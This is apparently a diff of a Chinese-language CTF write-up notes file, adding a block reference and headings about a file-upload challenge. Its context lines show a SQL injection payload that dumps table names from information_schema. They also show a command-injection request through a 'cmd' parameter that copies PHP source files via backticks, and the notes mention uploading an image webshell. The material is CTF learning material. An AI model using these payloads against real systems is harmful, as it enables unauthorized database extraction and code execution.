@@ -48,6 +48,9 @@ insert into article(title,author,description,content,dateline) values('114514' a
 ```
 10086',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'10086','10086','1919810')#
 ```
+
+^1e5e69
+
 ![[Pasted image 20240329125252.png]]
 爆字段名 为 id,flag_is_here
 ```
@@ -190,3 +193,7 @@ GET /start/vul.php?cmd=echo+"`cat+../a*/*.php`">1.txt
 ```
 insert into article(title,author,description,content,dateline) values('1'','13123','3131','313',1713177034)
 ```
+[嘤嘤嘤]P4_2
+文件上传
+直接传图片马
+[嘤嘤嘤]P4_3
